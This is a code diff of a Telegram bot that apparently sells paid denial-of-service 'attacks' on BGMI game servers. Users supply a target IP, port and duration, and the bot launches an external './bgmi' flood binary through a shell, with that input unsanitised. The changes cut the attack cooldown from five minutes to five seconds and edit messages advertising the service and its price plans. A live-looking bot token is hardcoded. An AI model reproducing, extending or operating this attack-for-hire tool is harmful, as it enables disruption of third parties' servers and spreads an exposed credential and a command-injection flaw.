@@ -11,7 +11,7 @@ import os
 bot = telebot.TeleBot('7284045723:AAE572P-NS8icyO_Vo30J3gIAHka1fweXOA')
 
 # Admin user IDs
-admin_id = ["6211690957,1351184742"]
+admin_id = ["6211690957"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@RINOMODSOFFICIAL"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nJoin - @RINOMODSOFFICIAL"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -224,8 +224,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
+                response = "You Are On Cooldown. Please Wait 5-second Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -244,11 +244,11 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"**BGMI Attack Finished. Target: {target} Port: {port} Time: {time}**"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "**Usage :- /bgmi <target> <port> <time>\n\nJoin For More Hacks - @RINOMODSOFFICIAL**"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\n\nJoin For More Hacks - @RINOMODSOFFICIAL"  # Updated command syntax
     else:
-        response = "**You Are Not Authorised To Use This Bot\n\nMessage To Buy - @OFFICIALRINO**"
+        response = "You Are Not Authorised To Use This Bot\n\nMessage To Buy - @OFFICIALRINO"
 
     bot.reply_to(message, response)
 
@@ -270,7 +270,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "**You Are Not Authorized To Use This Command**"
+        response = "You Are Not Authorized To Use This Command"
 
     bot.reply_to(message, response)
 
@@ -300,19 +300,14 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"**Helo {user_name}\nPress To See Available Commands - /help\n\nJoin Our Channel - @RINOMODSOFFICIAL**"
+    response = (f"Hello {user_name}\nPress To See All Commands = /help\nJoin - @RINOMODSOFFICIAL")
     bot.reply_to(message, response)
 
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''**{user_name} Please Follow These Rules:
-
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-Join - @RINOMODSOFFICIAL**'''
+    response = f'''{user_name} Please Follow These Rules\n\n1) Dont Run Too Many Attacks !! Cause A Ban From Bot\n2) Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.\n3) We Daily Checks The Logs So Follow these rules to avoid Ban.\nJoin - @RINOMODSOFFICIAL'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -336,16 +331,7 @@ Month-->1600 Rs
 @bot.message_handler(commands=['admincmd'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
-
-/add <userId> : Add a User.
-/remove <userid> Remove a User.
-/allusers : Authorised Users Lists.
-/logs : All Users Logs.
-/broadcast : Broadcast a Message.
-/clearlogs : Clear The Logs File.
-Join - @RINOMODSOFFICIAL
-'''
+    response = f'''{user_name}, Admin Commands Are Here\n/add <userId> : Add a User.\n/remove <userid> Remove a User.\n/allusers : Authorised Users Lists.\n/logs : All Users Logs.\n/broadcast : Broadcast a Message.\n/clearlogs : Clear The Logs File.\nJoin - @RINOMODSOFFICIAL'''
     bot.reply_to(message, response)
 
 
